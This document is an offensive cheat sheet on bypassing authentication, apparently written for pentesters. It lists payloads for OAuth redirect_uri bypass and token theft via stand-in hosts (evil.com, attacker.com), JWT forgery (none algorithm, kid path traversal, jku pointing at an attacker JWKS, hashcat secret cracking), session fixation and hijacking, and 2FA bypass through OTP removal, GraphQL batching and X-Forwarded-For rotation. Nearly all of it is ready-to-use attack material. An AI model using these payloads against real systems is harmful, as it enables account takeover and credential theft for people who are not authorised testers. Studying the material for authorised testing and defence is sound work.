# Authentication & Authorization Bypass

## OAuth 2.0 Exploitation

### CSRF in OAuth Flow
```http
GET /auth?client_id=app&redirect_uri=https://attacker.com&state=abc&response_type=code
```
No `state` parameter (or predictable state) = CSRF. Bind attacker account to victim's session.

### redirect_uri Validation Bypass
```bash
# Open redirect in redirect_uri
https://target.com/auth?redirect_uri=https://evil.com
# Subdomain confusion
https://target.com/auth?redirect_uri=https://target.com.evil.com
# Path traversal
https://target.com/auth?redirect_uri=https://target.com/../evil.com
# Fragment bypass (some validators don't check after #)
https://target.com/auth?redirect_uri=https://target.com/#@evil.com
```

### OAuth Token Theft via Referer
Some OAuth providers pass tokens via URL fragment (`#access_token=xxx`). If the page makes requests to third-party origins, the token leaks via `Referer` header.

### PKCE Downgrade
Some providers support PKCE but do not enforce it. Remove the `code_challenge` parameter → no PKCE → authorization code interception becomes possible.

## JWT Attacks

### None Algorithm
```python
import jwt
jwt.encode({"user": "admin"}, key="", algorithm="none")
```

### Weak HMAC Secret
```bash
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
# Or use jwt_tool
python3 jwt_tool.py -C -d rockyou.txt token
```

### kid Injection (Path Traversal)
```json
{
  "kid": "../../../dev/null",
  "user": "admin"
}
# Key is empty (because /dev/null is empty) → HMAC-SHA256 with empty key
```

### jku/x5u Header Injection
The `jku` (JWK Set URL) header can point to an attacker-controlled server:
```json
{"jku": "https://evil.com/jwks.json", "user": "admin"}
```
Host a JWK Set with your public key and sign arbitrary tokens.

## Session Flaw Exploitation

### Session Fixation
```http
GET /login?session_id=attacker_controlled HTTP/1.1
# If app uses the provided session instead of generating new one after login
# Attacker knows the session_id and hijacks after victim authenticates
```

### Session Token Predictability
```bash
# Collect 100+ session tokens
# Analyze pattern using Burp Sequencer
# If tokens are predictable (timestamp-based, MD5 hash), predict and hijack
```

### Session Not Invalidated on Logout
```http
# Login, capture session token
# Logout
# Test: is the old session token still valid?
GET /api/profile Cookie: session=old_token
# If 200, the app never invalidated the session
```

## 2FA Bypass

### Direct API Call
```http
POST /api/login HTTP/1.1
{"username": "victim", "password": "hacked"}
{"otp": ""}  # Remove OTP parameter entirely
{"otp": null}  # Send null OTP
```

### Rate Limiting Bypass on OTP
```http
# GraphQL batching
POST /graphql HTTP/1.1
{"query": "mutation { login(otp: "0000"), login2: login(otp: "0001"), ... }"}
# IP rotation via X-Forwarded-For
X-Forwarded-For: 127.0.0.1, 127.0.0.2, 127.0.0.3...
```

### Response Manipulation
```http
HTTP/1.1 401 Unauthorized  # Expected
# Change to:
HTTP/1.1 200 OK
# If client-side auth relies on response code, attacker-controlled proxy can modify it
```
